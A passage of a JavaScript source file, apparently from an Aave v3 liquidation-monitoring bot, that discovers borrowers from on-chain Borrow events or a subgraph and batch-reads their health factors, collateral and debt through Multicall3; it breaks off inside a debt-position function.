const { ethers } = require('ethers');
const fetch = require("node-fetch");
const {
  BACKFILL_VERSION,
  loadBorrowerSet,
  saveBorrowerSet,
  loadWatchlist,
  saveWatchlist,
  loadNear,
  saveNear,
  loadHot,
  saveHot,
  loadActiveDebt,
  saveActiveDebt,
} = require("./src/borrowerStore");
const { recordTierSnapshot } = require("./src/tierSnapshot");
const { aggregate3InBatches, aggregate3Streaming } = require("./src/multicall");
const metrics = require("./src/metrics");

// Interface used to encode/decode getUserAccountData calls for Multicall3.
const POOL_IFACE = new ethers.utils.Interface([
  "function getUserAccountData(address user) view returns (uint256 totalCollateralBase, uint256 totalDebtBase, uint256 availableBorrowsBase, uint256 currentLiquidationThreshold, uint256 ltv, uint256 healthFactor)",
]);

// Interface for ProtocolDataProvider.getUserReserveData, used to batch a user's
// per-reserve debt/collateral reads into ONE Multicall3 round-trip during
// enrichment (instead of one serial RPC call per reserve, per candidate).
const DATA_PROVIDER_IFACE = new ethers.utils.Interface([
  "function getUserReserveData(address asset, address user) view returns (uint256 currentATokenBalance, uint256 currentStableDebt, uint256 currentVariableDebt, uint256 principalStableDebt, uint256 scaledVariableDebt, uint256 stableBorrowRate, uint256 liquidityRate, uint40 stableRateLastUpdated, bool usageAsCollateralEnabled)",
]);

// Per-chain caches for rarely-changing reads, so enrichment doesn't re-fetch
// them once per candidate during a race. Keyed by chain. Reserves list changes
// only when Aave lists/drops a reserve; ERC-20 symbol/decimals are immutable.
const reservesListCache = new Map(); // chainKey -> { reserves, fetchedAt }
const assetMetaCache = new Map(); // `${chainKey}:${asset.toLowerCase()}` -> { symbol, decimals }
const RESERVES_CACHE_TTL_MS = parseInt(process.env.RESERVES_CACHE_TTL_MS || "300000", 10); // 5 min

const DEFAULT_SUBGRAPH_URL = "https://metisapi.0xgraph.xyz/subgraphs/name/aave/protocol-v3-metis";
const BORROW_EVENT_ABI = [
  "event Borrow(address indexed reserve, address user, address indexed onBehalfOf, uint256 amount, uint8 interestRateMode, uint256 borrowRate, uint16 indexed referralCode)"
];
const POOL_ABI = [
  "function getReservesList() view returns (address[])",
  "function getUserAccountData(address user) view returns (uint256 totalCollateralBase, uint256 totalDebtBase, uint256 availableBorrowsBase, uint256 currentLiquidationThreshold, uint256 ltv, uint256 healthFactor)"
];
const PROTOCOL_DATA_PROVIDER_ABI = [
  "function getUserReserveData(address asset, address user) view returns (uint256 currentATokenBalance, uint256 currentStableDebt, uint256 currentVariableDebt, uint256 principalStableDebt, uint256 scaledVariableDebt, uint256 stableBorrowRate, uint256 liquidityRate, uint40 stableRateLastUpdated, bool usageAsCollateralEnabled)"
];
const ERC20_METADATA_ABI = [
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)"
];

function logVerbose(...args) {
  if (process.env.VERBOSE_HEALTH_LOGS === "true") {
    console.log(...args);
  }
}

const warnedStaleBackfill = new Set();

// Runs `worker` over `items` with a bounded number of concurrent calls.
// Used so health-factor checks across hundreds/thousands of borrowers happen
// in parallel (a few dozen at a time) instead of one slow RPC round-trip at a
// time, while staying under public-RPC rate limits. Results preserve input order.
async function mapWithConcurrency(items, concurrency, worker) {
  const results = new Array(items.length);
  let nextIndex = 0;

  async function runner() {
    while (true) {
      const current = nextIndex++;
      if (current >= items.length) {
        return;
      }
      results[current] = await worker(items[current], current);
    }
  }

  const limit = Math.max(1, Math.min(concurrency, items.length));
  await Promise.all(Array.from({ length: limit }, runner));
  return results;
}

// Reads health factors for many users in a few RPC round-trips via Multicall3,
// instead of one getUserAccountData call per user. Returns [{ user, healthFactor }]
// in input order. Users with no debt return a huge HF (Aave returns max uint256);
// failed/undecodable calls return Infinity so they're treated as healthy/skip.
async function getUserHealthFactorsBatched(users, provider, chainConfig = {}) {
  const poolAddress = getPoolAddress(chainConfig);
  if (!poolAddress || users.length === 0) {
    return users.map((user) => ({ user, healthFactor: 999 }));
  }

  const callData = POOL_IFACE.encodeFunctionData("getUserAccountData", [users[0]]);
  void callData; // (per-user calldata built below; this validates the signature once)

  const calls = users.map((user) => ({
    target: poolAddress,
    allowFailure: true,
    callData: POOL_IFACE.encodeFunctionData("getUserAccountData", [user]),
  }));

  const batchSize = parseInt(process.env.MULTICALL_BATCH_SIZE || "300", 10);
  const raw = await aggregate3InBatches(provider, calls, batchSize);

  return users.map((user, i) => decodeAccountData(user, raw[i]));
}

// Decodes one Multicall3 getUserAccountData entry into { user, healthFactor,
// totalDebtUsd }. A missing/failed/empty entry (no debt, bad address, reverted
// call) yields a huge HF + zero debt so it's treated as healthy/skip. Shared by
// both the materialized (getUserHealthFactorsBatched) and streaming sweep paths.
function decodeAccountData(user, entry) {
  if (!entry || !entry.success || !entry.returnData || entry.returnData === "0x") {
    return { user, healthFactor: Infinity, totalDebtUsd: 0 };
  }
  try {
    const decoded = POOL_IFACE.decodeFunctionResult("getUserAccountData", entry.returnData);
    const hf = parseFloat(ethers.utils.formatUnits(decoded.healthFactor, 18));
    // Aave v3 base currency is USD with 8 decimals (verified on-chain).
    const totalDebtUsd = parseFloat(ethers.utils.formatUnits(decoded.totalDebtBase, 8));
    return {
      user,
      healthFactor: Number.isFinite(hf) ? hf : Infinity,
      totalDebtUsd: Number.isFinite(totalDebtUsd) ? totalDebtUsd : 0,
    };
  } catch (error) {
    return { user, healthFactor: Infinity, totalDebtUsd: 0 };
  }
}

// Memory-safe health-factor sweep for large borrower sets. Encodes one batch of
// getUserAccountData calls at a time, fetches it via Multicall3, decodes it, and
// hands each decoded { user, healthFactor, totalDebtUsd } to `onUser` — then
// DISCARDS the batch before building the next. Peak heap is O(batchSize) rather
// than O(users), which is what lets Base's ~210k-borrower full sweep complete
// instead of exhausting V8's heap. Returns the number of users swept.
//
// opts.onBatchDone(usersSweptSoFar) — optional, awaited after each batch. Lets a
// long full sweep checkpoint progress (e.g. persist the partial watchlist) so a
// mid-sweep crash resumes near where it stopped instead of restarting from zero.
async function sweepHealthFactorsStreaming(users, provider, chainConfig, onUser, opts = {}) {
  const poolAddress = getPoolAddress(chainConfig);
  if (!poolAddress || users.length === 0) {
    for (const user of users) onUser({ user, healthFactor: 999, totalDebtUsd: 0 });
    return users.length;
  }

  const batchSize = parseInt(process.env.MULTICALL_BATCH_SIZE || "300", 10);
  const onBatchDone = typeof opts.onBatchDone === "function" ? opts.onBatchDone : null;

  // Build the full call list once (each entry is small per-user calldata), then
  // stream it through Multicall3 one batch at a time. aggregate3Streaming fetches
  // a batch, hands us its results, and discards them before the next — so the
  // only large structures alive are `calls` (input) and `users` (the caller's
  // borrower list); the heavy decoded results never accumulate.
  const calls = users.map((user) => ({
    target: poolAddress,
    allowFailure: true,
    callData: POOL_IFACE.encodeFunctionData("getUserAccountData", [user]),
  }));

  await aggregate3Streaming(provider, calls, batchSize, async (batchResults, startIndex) => {
    for (let j = 0; j < batchResults.length; j++) {
      const user = users[startIndex + j];
      onUser(decodeAccountData(user, batchResults[j]));
    }
    if (onBatchDone) await onBatchDone(startIndex + batchResults.length);
  });

  return users.length;
}

// ABI for Aave's UI Pool Data Provider (if needed for other functions)
const UI_POOL_DATA_PROVIDER_ABI = [
    {
        "inputs": [
            {
                "internalType": "contract IEACAggregatorProxy",
                "name": "_networkBaseTokenPriceInUsdProxyAggregator",
                "type": "address"
            },
            {
                "internalType": "contract IEACAggregatorProxy",
                "name": "_marketReferenceCurrencyPriceInUsdProxyAggregator",
                "type": "address"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "ETH_CURRENCY_UNIT",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "MKR_ADDRESS",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "_bytes32",
                "type": "bytes32"
            }
        ],
        "name": "bytes32ToString",
        "outputs": [
            {
                "internalType": "string",
                "name": "",
                "type": "string"
            }
        ],
        "stateMutability": "pure",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "contract IPoolAddressesProvider",
                "name": "provider",
                "type": "address"
            }
        ],
        "name": "getEModes",
        "outputs": [
            {
                "components": [
                    {
                        "internalType": "uint8",
                        "name": "id",
                        "type": "uint8"
                    },
                    {
                        "components": [
                            {
                                "internalType": "uint16",
                                "name": "ltv",
                                "type": "uint16"
                            },
                            {
                                "internalType": "uint16",
                                "name": "liquidationThreshold",
                                "type": "uint16"
                            },
                            {
                                "internalType": "uint16",
                                "name": "liquidationBonus",
                                "type": "uint16"
                            },
                            {
                                "internalType": "uint128",
                                "name": "collateralBitmap",
                                "type": "uint128"
                            },
                            {
                                "internalType": "string",
                                "name": "label",
                                "type": "string"
                            },
                            {
                                "internalType": "uint128",
                                "name": "borrowableBitmap",
                                "type": "uint128"
                            }
                        ],
                        "internalType": "struct DataTypes.EModeCategory",
                        "name": "eMode",
                        "type": "tuple"
                    }
                ],
                "internalType": "struct IUiPoolDataProviderV3.Emode[]",
                "name": "",
                "type": "tuple[]"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "contract IPoolAddressesProvider",
                "name": "provider",
                "type": "address"
            }
        ],
        "name": "getReservesData",
        "outputs": [
            {
                "components": [
                    {
                        "internalType": "address",
                        "name": "underlyingAsset",
                        "type": "address"
                    },
                    {
                        "internalType": "string",
                        "name": "name",
                        "type": "string"
                    },
                    {
                        "internalType": "string",
                        "name": "symbol",
                        "type": "string"
                    },
                    {
                        "internalType": "uint256",
                        "name": "decimals",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "baseLTVasCollateral",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "reserveLiquidationThreshold",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "reserveLiquidationBonus",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "reserveFactor",
                        "type": "uint256"
                    },
                    {
                        "internalType": "bool",
                        "name": "usageAsCollateralEnabled",
                        "type": "bool"
                    },
                    {
                        "internalType": "bool",
                        "name": "borrowingEnabled",
                        "type": "bool"
                    },
                    {
                        "internalType": "bool",
                        "name": "isActive",
                        "type": "bool"
                    },
                    {
                        "internalType": "bool",
                        "name": "isFrozen",
                        "type": "bool"
                    },
                    {
                        "internalType": "uint128",
                        "name": "liquidityIndex",
                        "type": "uint128"
                    },
                    {
                        "internalType": "uint128",
                        "name": "variableBorrowIndex",
                        "type": "uint128"
                    },
                    {
                        "internalType": "uint128",
                        "name": "liquidityRate",
                        "type": "uint128"
                    },
                    {
                        "internalType": "uint128",
                        "name": "variableBorrowRate",
                        "type": "uint128"
                    },
                    {
                        "internalType": "uint40",
                        "name": "lastUpdateTimestamp",
                        "type": "uint40"
                    },
                    {
                        "internalType": "address",
                        "name": "aTokenAddress",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "variableDebtTokenAddress",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "interestRateStrategyAddress",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "availableLiquidity",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "totalScaledVariableDebt",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "priceInMarketReferenceCurrency",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "priceOracle",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "variableRateSlope1",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "variableRateSlope2",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "baseVariableBorrowRate",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "optimalUsageRatio",
                        "type": "uint256"
                    },
                    {
                        "internalType": "bool",
                        "name": "isPaused",
                        "type": "bool"
                    },
                    {
                        "internalType": "bool",
                        "name": "isSiloedBorrowing",
                        "type": "bool"
                    },
                    {
                        "internalType": "uint128",
                        "name": "accruedToTreasury",
                        "type": "uint128"
                    },
                    {
                        "internalType": "uint128",
                        "name": "unbacked",
                        "type": "uint128"
                    },
                    {
                        "internalType": "uint128",
                        "name": "isolationModeTotalDebt",
                        "type": "uint128"
                    },
                    {
                        "internalType": "bool",
                        "name": "flashLoanEnabled",
                        "type": "bool"
                    },
                    {
                        "internalType": "uint256",
                        "name": "debtCeiling",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "debtCeilingDecimals",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "borrowCap",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "supplyCap",
                        "type": "uint256"
                    },
                    {
                        "internalType": "bool",
                        "name": "borrowableInIsolation",
                        "type": "bool"
                    },
                    {
                        "internalType": "bool",
                        "name": "virtualAccActive",
                        "type": "bool"
                    },
                    {
                        "internalType": "uint128",
                        "name": "virtualUnderlyingBalance",
                        "type": "uint128"
                    }
                ],
                "internalType": "struct IUiPoolDataProviderV3.AggregatedReserveData[]",
                "name": "",
                "type": "tuple[]"
            },
            {
                "components": [
                    {
                        "internalType": "uint256",
                        "name": "marketReferenceCurrencyUnit",
                        "type": "uint256"
                    },
                    {
                        "internalType": "int256",
                        "name": "marketReferenceCurrencyPriceInUsd",
                        "type": "int256"
                    },
                    {
                        "internalType": "int256",
                        "name": "networkBaseTokenPriceInUsd",
                        "type": "int256"
                    },
                    {
                        "internalType": "uint8",
                        "name": "networkBaseTokenPriceDecimals",
                        "type": "uint8"
                    }
                ],
                "internalType": "struct IUiPoolDataProviderV3.BaseCurrencyInfo",
                "name": "",
                "type": "tuple"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "contract IPoolAddressesProvider",
                "name": "provider",
                "type": "address"
            }
        ],
        "name": "getReservesList",
        "outputs": [
            {
                "internalType": "address[]",
                "name": "",
                "type": "address[]"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "contract IPoolAddressesProvider",
                "name": "provider",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "getUserReservesData",
        "outputs": [
            {
                "components": [
                    {
                        "internalType": "address",
                        "name": "underlyingAsset",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "scaledATokenBalance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "bool",
                        "name": "usageAsCollateralEnabledOnUser",
                        "type": "bool"
                    },
                    {
                        "internalType": "uint256",
                        "name": "scaledVariableDebt",
                        "type": "uint256"
                    }
                ],
                "internalType": "struct IUiPoolDataProviderV3.UserReserveData[]",
                "name": "",
                "type": "tuple[]"
            },
            {
                "internalType": "uint8",
                "name": "",
                "type": "uint8"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "marketReferenceCurrencyPriceInUsdProxyAggregator",
        "outputs": [
            {
                "internalType": "contract IEACAggregatorProxy",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "networkBaseTokenPriceInUsdProxyAggregator",
        "outputs": [
            {
                "internalType": "contract IEACAggregatorProxy",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

async function getBorrowersFromSubgraph(chainConfig = {}) {
    const query = `
    {
      borrows(first: 1000, orderBy: timestamp, orderDirection: desc) {
        user {
          id  # Borrower's wallet address
        }
      }
    }`;

    const response = await fetch(getSubgraphUrl(chainConfig), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ query }),
    });

    const data = await response.json();

    console.log("📜 Raw Borrower Data from Subgraph:", JSON.stringify(data, null, 2));

    if (!data || !data.data || !data.data.borrows) {
        console.error("❌ Error: Unexpected response format from The Graph.");
        return [];
    }

    // Extract unique borrowers
    const uniqueBorrowers = new Set();
    data.data.borrows.forEach(borrow => {
        if (borrow.user && borrow.user.id) {
            uniqueBorrowers.add(borrow.user.id.toLowerCase()); // Normalize case
        }
    });

    console.log(`✅ Found ${uniqueBorrowers.size} unique borrowers.`);
    return Array.from(uniqueBorrowers);
}

// Scans a [fromBlock, toBlock] range for Borrow events in chunks and adds
// every borrower into `target`. Returns the number of new addresses added.
// `checkpoint(lastCompletedBlock)` is called every CHECKPOINT_EVERY_CHUNKS so a
// long backfill persists progress and can resume after an interruption.
// `newKeys` (optional Set) collects addresses that were not already in `target`
// — used so the caller can health-check freshly-discovered borrowers this cycle.
async function scanBorrowRange(pool, fromBlock, toBlock, chunkSize, target, label, checkpoint, newKeys) {
    let added = 0;
    let chunkIndex = 0;
    const checkpointEvery = parseInt(process.env.CHECKPOINT_EVERY_CHUNKS || "25", 10);
    const totalChunks = Math.ceil((toBlock - fromBlock + 1) / chunkSize);

    for (let startBlock = fromBlock; startBlock <= toBlock; startBlock += chunkSize) {
      const endBlock = Math.min(startBlock + chunkSize - 1, toBlock);
      try {
        const events = await pool.queryFilter(pool.filters.Borrow(), startBlock, endBlock);
        for (const event of events) {
          const borrower = event.args.onBehalfOf || event.args.user;
          if (borrower && borrower !== ethers.constants.AddressZero) {
            const key = borrower.toLowerCase();
            if (!target.has(key)) {
              added++;
              if (newKeys) newKeys.add(key);
            }
            target.add(key);
          }
        }
      } catch (error) {
        console.warn(`⚠️ ${label}: Borrow scan failed for blocks ${startBlock}-${endBlock}: ${error.message}`);
      }

      chunkIndex++;
      if (checkpoint && chunkIndex % checkpointEvery === 0) {
        // endBlock is fully scanned at this point; persist it as the resume point.
        checkpoint(endBlock);
        if (totalChunks > checkpointEvery) {
          console.log(`   …${label}: backfill ${chunkIndex}/${totalChunks} chunks (${target.size} borrowers so far)`);
        }
      }
    }
    return added;
}

function getBorrowBackfillPlan(currentBlock, chainConfig = {}) {
    const fromDeployment = process.env.BORROW_BACKFILL_FROM_DEPLOYMENT !== "false";
    const capDepth = chainConfig.borrowBackfillBlocks || chainConfig.borrowScanBlocks || 100000;
    const windowFloor = Math.max(currentBlock - capDepth, 0);
    const deploymentFloor = Number.isFinite(chainConfig.deploymentBlock)
      ? Math.max(chainConfig.deploymentBlock, 0)
      : null;
    const floor = (fromDeployment && deploymentFloor !== null)
      ? Math.max(deploymentFloor, windowFloor)
      : windowFloor;
    return {
      floor,
      source: fromDeployment && deploymentFloor !== null ? "deployment" : "window",
      version: BACKFILL_VERSION,
    };
}

function borrowerBackfillIsCurrent(state, plan) {
    if (!state || !state.backfillDone) return false;
    return (
      Number.isFinite(state.backfillFloorBlock) &&
      state.backfillFloorBlock <= plan.floor &&
      state.backfillSource === plan.source &&
      state.backfillVersion === plan.version
    );
}

// Backfill-aware borrower discovery.
//
// The original implementation only scanned the last `borrowScanBlocks` of
// Borrow events every cycle. Liquidatable positions are almost always AGED
// positions (price drift / interest accrual), not fresh borrows, so that
// candidate set systematically missed the wallets most likely to be
// underwater (measured: 35 of 36 Arbitrum liquidations were invisible to it).
//
// Now: on first run we backfill `borrowBackfillBlocks` of history (deep,
// one-time), persist the borrower set, and on every subsequent run only scan
// the new blocks since `lastScannedBlock`. The persisted set keeps growing and
// the per-cycle cost stays tiny.
async function getBorrowersFromBorrowEvents(provider, chainConfig = {}) {
    const poolAddress = getPoolAddress(chainConfig);
    const pool = new ethers.Contract(poolAddress, BORROW_EVENT_ABI, provider);
    const currentBlock = await provider.getBlockNumber();
    const chunkSize = chainConfig.borrowScanChunkSize || 10000;
    const chainKey = chainConfig.key || "default";

    const state = loadBorrowerSet(chainKey);
    const { borrowers } = state;
    const backfillPlan = getBorrowBackfillPlan(currentBlock, chainConfig);

    if (!state.backfillDone) {
      // DEEP BACKFILL (one-time, resumable). Floor is the pool deployment block
      // (captures ALL historical borrowers — the aged positions that actually
      // get liquidated), BUT never deeper than borrowBackfillBlocks, which acts
      // as a max-depth cap. On chains with very long histories + slow public RPCs
      // Set BORROW_BACKFILL_FROM_DEPLOYMENT=false to ignore the deployment block
      // and use only the rolling max-depth window.
      const floor = backfillPlan.floor;

      // Resume from where a prior interrupted backfill left off.
      const fromBlock = Number.isFinite(state.backfillCursor)
        ? Math.max(state.backfillCursor + 1, floor)
        : floor;
      const chunks = Math.ceil((currentBlock - fromBlock) / chunkSize);
      const resuming = Number.isFinite(state.backfillCursor);
      console.log(`📚 ${chainConfig.name}: ${resuming ? "RESUME" : "BACKFILL"} Borrow scan ${fromBlock} → ${currentBlock} (~${chunks} chunks, one-time).`);

      const added = await scanBorrowRange(
        pool, fromBlock, currentBlock, chunkSize, borrowers, chainConfig.name || "Aave",
        (checkpointBlock) => saveBorrowerSet(chainKey, borrowers, null, {
          backfillCursor: checkpointBlock,
          backfillDone: false,
          backfillFloorBlock: floor,
          backfillSource: backfillPlan.source,
          backfillVersion: backfillPlan.version,
        })
      );
      // Backfill reached head: mark done and record head as the incremental anchor.
      saveBorrowerSet(chainKey, borrowers, currentBlock, {
        backfillCursor: currentBlock,
        backfillDone: true,
        backfillFloorBlock: floor,
        backfillSource: backfillPlan.source,
        backfillVersion: backfillPlan.version,
      });
      console.log(`✅ ${chainConfig.name}: BACKFILL complete — ${borrowers.size} known borrowers (+${added} new).`);
      return Array.from(borrowers);
    }

    if (!borrowerBackfillIsCurrent(state, backfillPlan) && !warnedStaleBackfill.has(chainKey)) {
      warnedStaleBackfill.add(chainKey);
      console.warn(
        `⚠️ ${chainConfig.name}: borrower store metadata is stale or missing ` +
        `(have floor=${state.backfillFloorBlock || "?"}, source=${state.backfillSource || "?"}, version=${state.backfillVersion || "?"}; ` +
        `want floor<=${backfillPlan.floor}, source=${backfillPlan.source}, version=${backfillPlan.version}). ` +
        `Run scripts/deepBackfillBorrowers.js ${chainKey} --from-deployment --merge --mark-cold-stale.`
      );
    }

    // INCREMENTAL: backfill is done, only scan new blocks since last head.
    // Re-scan the last chunk too, in case a prior run stopped mid-chunk or a
    // reorg shuffled recent blocks.
    const anchor = Number.isFinite(state.lastScannedBlock) ? state.lastScannedBlock : currentBlock;
    const fromBlock = Math.max(anchor - chunkSize, 0);
    console.log(`🔁 ${chainConfig.name}: incremental Borrow scan ${fromBlock} → ${currentBlock} (known borrowers: ${borrowers.size}).`);

    const newThisScan = new Set();
    const added = await scanBorrowRange(pool, fromBlock, currentBlock, chunkSize, borrowers, chainConfig.name || "Aave", null, newThisScan);
    saveBorrowerSet(chainKey, borrowers, currentBlock, {
      backfillCursor: currentBlock,
      backfillDone: true,
      backfillFloorBlock: state.backfillFloorBlock,
      backfillSource: state.backfillSource,
      backfillVersion: state.backfillVersion,
    });

    console.log(`✅ ${chainConfig.name}: ${borrowers.size} known borrowers (+${added} new this scan).`);
    // Expose the freshly-discovered addresses (as a property on the returned
    // array, so existing array callers are unaffected) so getUnhealthyPositions
    // can health-check them THIS cycle instead of waiting for the next full sweep.
    const result = Array.from(borrowers);
    result.newThisScan = newThisScan;
    return result;
}

async function getBorrowers(provider, chainConfig = {}) {
    if (chainConfig.subgraphUrl && chainConfig.borrowerSource === "subgraph") {
      return getBorrowersFromSubgraph(chainConfig);
    }

    return getBorrowersFromBorrowEvents(provider, chainConfig);
}

// Fetch user debt, collateral, and health factor

// Get user's health factor from the Aave contract
async function getUserHealthFactor(userAddress, provider, chainConfig = {}) {
    const poolAddress = getPoolAddress(chainConfig);
    if (!poolAddress) {
        console.error("POOL_ADDRESS not set in environment variables");
        return 999;
    }

    const pool = new ethers.Contract(poolAddress, POOL_ABI, provider);
    try {
        const data = await pool.getUserAccountData(userAddress);
        const healthFactor = parseFloat(ethers.utils.formatUnits(data.healthFactor, 18));
        logVerbose(`Health factor for ${userAddress}: ${healthFactor}`);
        return healthFactor;
    } catch (error) {
        console.error(`Health factor check failed for ${userAddress}:`, error.message);
        return 999; // Return high HF to skip invalid users
    }
}


// Get user's primary collateral.
async function getPrimaryCollateral(userAddress, provider, chainConfig = {}) {
    if (chainConfig.protocolDataProvider) {
      const positions = await getUserReservePositions(userAddress, provider, chainConfig);
      const collateralPositions = positions
        .filter((position) => position.currentATokenBalance.gt(ethers.constants.Zero) && position.usageAsCollateralEnabled)
        .sort((left, right) => {
          if (left.currentATokenBalance.eq(right.currentATokenBalance)) return 0;
          return left.currentATokenBalance.gt(right.currentATokenBalance) ? -1 : 1;
        });

      if (collateralPositions.length > 0) {
        const collateral = collateralPositions[0];
        console.log(`✅ Found collateral: ${collateral.asset}`);
        return collateral.asset;
      }

      console.warn(`⚠️ Warning: User ${userAddress} has no valid collateral.`);
      return null;
    }

    const query = `
    {
      userReserves(where: { user: "${userAddress.toLowerCase()}" }) {
        reserve {
          underlyingAsset
          symbol
        }
        scaledATokenBalance  # Represents the user's supplied balance
        scaledVariableDebt   # Represents the user's debt balance
      }
    }`;

    try {
        console.log(`🔎 Fetching collateral for ${userAddress}...`); // 🛠 Debug log

        const response = await fetch(getSubgraphUrl(chainConfig), {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ query }),
        });

        const data = await response.json();
        console.log(`📜 Raw response for ${userAddress}:`, JSON.stringify(data, null, 2)); // 🛠 Debug log

        if (!data.data || data.data.userReserves.length === 0) {
            console.warn(`⚠️ Warning: No collateral found for user ${userAddress}`);
            return null;
        }

        // Find the first asset that has a positive balance (i.e., collateral)
        for (const reserve of data.data.userReserves) {
            if (ethers.BigNumber.from(reserve.scaledATokenBalance).gt(ethers.constants.Zero)) {
                console.log(`✅ Found collateral: ${reserve.reserve.symbol} (${reserve.reserve.underlyingAsset})`);
                return reserve.reserve.underlyingAsset;
            }
        }

        console.warn(`⚠️ Warning: User ${userAddress} has no valid collateral.`);
        return null;
    } catch (error) {
        console.error(`❌ Failed to fetch collateral for ${userAddress}:`, error.message);
        return null;
    }
}

// Get user's debt position for the configured debt asset.
async function getDebtPosition(userAddress, provider, debtAssetAddress, chainConfig = {}) {
    debtAssetAddress = debtAssetAddress || chainConfig.debtAssetAddress || process.env.DEBT_ASSET_ADDRESS;
    if (!debtAssetAddress) {
      console.warn("DEBT_ASSET_ADDRESS is not set. Skipping debt lookup.");
      return {
        debtAsset: null,
        debtAmount: ethers.constants.Zero,
        debtSymbol: "unknown",
        debtDecimals: 18,
      };
    }

    console.log(`🔍 Fetching debt for ${userAddress} on asset ${debtAssetAddress}...`);

    if (chainConfig.protocolDataProvider) {
      const [reserveData, metadata] = await Promise.all([
        getUserReserveData(debtAssetAddress, userAddress, provider, chainConfig),
        getAssetMetadataCached(debtAssetAddress, provider, chainConfig),
      ]);
      const debtAmount = reserveData.currentStableDebt.add(reserveData.currentVariableDebt);

      if (debtAmount.lte(ethers.constants.Zero)) {
        console.warn(`⚠️ No positive ${metadata.symbol} debt found for ${userAddress}`);
        return {
          debtAsset: debtAssetAddress,
          debtAmount: ethers.constants.Zero,
          debtSymbol: metadata.symbol,
          debtDecimals: metadata.decimals,
        };
      }

      console.log(
        `💰 ${metadata.symbol} debt for ${userAddress}: ${ethers.utils.formatUnits(debtAmount, metadata.decimals)}`
      );
      return {
        debtAsset: debtAssetAddress,
        debtAmount,
        debtSymbol: metadata.symbol,
        debtDecimals: metadata.decimals,
      };
    }
  
    const query = `
    {
      userReserves(where: { user: "${userAddress}" }) {
        reserve {
          underlyingAsset
          symbol
          decimals
        }
        currentTotalDebt
      }
    }`;
  
    const response = await fetch(getSubgraphUrl(chainConfig), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query }),
    });
  
    const data = await response.json();
    console.log(`📜 Raw debt response for ${userAddress}:`, JSON.stringify(data, null, 2));
  
    if (!data.data.userReserves.length) {
      console.warn(`⚠️ No debt found for ${userAddress}`);
      return {
        debtAsset: debtAssetAddress,
        debtAmount: ethers.constants.Zero,
        debtSymbol: "unknown",
        debtDecimals: 18,
      };
    }

    const targetReserve = data.data.userReserves.find((reserve) => {
      return reserve.reserve.underlyingAsset.toLowerCase() === debtAssetAddress.toLowerCase();
    });

    if (!targetReserve) {
      console.warn(`⚠️ No matching debt reserve found for ${userAddress}`);
      return {
        debtAsset: debtAssetAddress,
        debtAmount: ethers.constants.Zero,
        debtSymbol: "unknown",
        debtDecimals: 18,
      };
    }

    const debtAmount = ethers.BigNumber.from(targetReserve.currentTotalDebt);
    const decimals = Number(targetReserve.reserve.decimals);
    if (debtAmount.lte(ethers.constants.Zero)) {
      console.warn(`⚠️ No positive ${targetReserve.reserve.symbol} debt found for ${userAddress}`);
      return {
        debtAsset: debtAssetAddress,
        debtAmount: ethers.constants.Zero,
        debtSymbol: targetReserve.reserve.symbol,
        debtDecimals: decimals,
      };
    }

    console.log(
      `💰 ${targetReserve.reserve.symbol} debt for ${userAddress}: ${ethers.utils.formatUnits(debtAmount, decimals)}`
    );
    return {
      debtAsset: debtAssetAddress,
      debtAmount,
      debtSymbol: targetReserve.reserve.symbol,
      debtDecimals: decimals,
    };
  }

async function getPrimaryDebtPosition(userAddress, provider, chainConfig = {}) {
    const preferredDebtAsset = chainConfig.debtAssetAddress || process.env.DEBT_ASSET_ADDRESS;

    if (preferredDebtAsset) {
      const preferredDebt = await getDebtPosition(userAddress, provider, preferredDebtAsset, chainConfig);
      if (preferredDebt.debtAmount.gt(ethers.constants.Zero)) {
        return preferredDebt;
      }
    }

    const debtPositions = await getDebtPositions(userAddress, provider, chainConfig);
    if (debtPositions.length === 0) {
      return {
        debtAsset: preferredDebtAsset || null,
        debtAmount: ethers.constants.Zero,
        debtSymbol: "unknown",
        debtDecimals: 18,
      };
    }

